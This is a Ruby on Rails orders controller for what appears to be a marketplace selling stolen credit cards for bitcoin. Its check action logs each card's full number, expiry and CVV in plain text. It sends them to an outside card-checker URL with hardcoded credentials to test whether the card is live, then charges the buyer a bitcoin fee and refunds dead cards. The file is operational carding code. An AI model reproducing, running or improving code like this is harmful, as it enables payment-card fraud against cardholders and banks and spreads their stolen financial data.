class OrdersController < ApplicationController
    before_action :authenticate_user!
    before_action :get_orders, only: [:index, :check_cards]

    def index

    end

    def show
        @order = current_user.orders.find(params[:id])
    end

    def check_cards

    end

    def sales

    end

    def check
        @order = Order.find(params[:order_item_id])
        item = @order.order_items.first.item
        expiry = item.itemable.expiry

        if "/".in?(expiry) || "|".in?(expiry)
            if expiry.length.eql?(7)
                expiry = expiry.gsub('/', '|')
            elsif expiry.length.eql?(6)
                expiry = expiry.gsub('/', '|')
                expiry = expiry.insert(0, '0')
            elsif expiry.length.eql?(5)
                expiry = expiry.gsub('/', '|')
                expiry = expiry.insert(3, '20')
            elsif expiry.length.eql?(4)
                expiry = expiry.gsub('/', '|')
                expiry = expiry.insert(0, '0')
                expiry = expiry.insert(3, '20')
            else
                # expiry = expiry.insert(2, '|')
            end
        else
            expiry = expiry.insert(2, '|')
        end

        cc = "#{item.itemable.card_number.to_i}|#{expiry}|#{item.itemable.cvv}"
        logger.info "######## CREDIT: #{cc}"
        @response = HTTParty.get("http://www.ug-market.com/ugm/xcheck.php?user=g0rx9&pwd=rootxroot&gate=checkcvv9&cc=#{cc}")
        # convert response to string
        @response = @response.to_s
        logger.info "######## RESPONSE: #{@response}"
        # partition string
        @response = @response.partition('_')
        # get status from partition response
        @status = @response[0].partition('=').last.downcase
        logger.info "######## STATUS: #{@status}"

        case @status
            when "live"
                begin
                    logger.info "######## ITS LIVE"
                    @order.complete!
                    disable_check(@order)

                    # transfer bitcoins from buyer's account to webmaster's address
                    @wallet.send(
                        ENV['DEFAULT_BTC_ADDRESS'], 100000, from_address: current_user.btc_account.address
                    )

                    # get buyer's balance
                    balance = @wallet.get_address(current_user.btc_account.address, confirmations = 1)

                    # update buyer's balance
                    current_user.btc_account.btc_account_balance.update(
                        available_balance:balance
                    )
                rescue Blockchain::APIException => e
                    flash[:error] = e.to_s
                end
            when "die"
                begin
                    logger.info "######## ITS DEAD"
                    @order.decline!
                    disable_check(@order)
                    # transfer bitcoins from buyer's account to webmaster's address
                    @wallet.send(
                        ENV['DEFAULT_BTC_ADDRESS'], 100000, from_address: current_user.btc_account.address
                    )

                    # get buyer's balance
                    balance = @wallet.get_address(current_user.btc_account.address, confirmations = 1)

                    # update buyer's balance
                    current_user.btc_account.btc_account_balance.update(
                        available_balance:balance
                    )

                    # process refund
                    RefundWorker.perform_async(@order.id)

                    flash[:notice] = "Check failed your refund is being processed"
                rescue
                    flash[:error] = e.to_s
                end
            when "invalid"
                begin
                    logger.info "######## ITS INVALID"
                    @order.decline!
                    disable_check(@order)
                    logger.info "######## ITS DEAD"
                    @order.decline!
                    disable_check(@order)
                    # transfer bitcoins from buyer's account to webmaster's address
                    @wallet.send(
                        ENV['DEFAULT_BTC_ADDRESS'], 100000, from_address: current_user.btc_account.address
                    )

                    # get buyer's balance
                    balance = @wallet.get_address(current_user.btc_account.address, confirmations = 1)

                    # update buyer's balance
                    current_user.btc_account.btc_account_balance.update(
                        available_balance:balance
                    )

                    # process refund
                    RefundWorker.perform_async(@order.id)

                    flash[:notice] = "Check failed your refund is being processed"
                rescue
                    flash[:error] = e.to_s
                end
                # RefundWorker.perform_async(@order.id)
            when "error"
                flash[:error] = "Checker services currently unavailable please try again later"
            end

        respond_to do |format|
            format.html { redirect_to orders_path }
        end
    end

    private
        def disable_check(order)
            order.order_items.first.item.can_check = false
            order.order_items.first.item.save!
        end

        def get_orders
            @orders = Order.where(customer_id: current_user.id).order('created_at desc')
        end
end
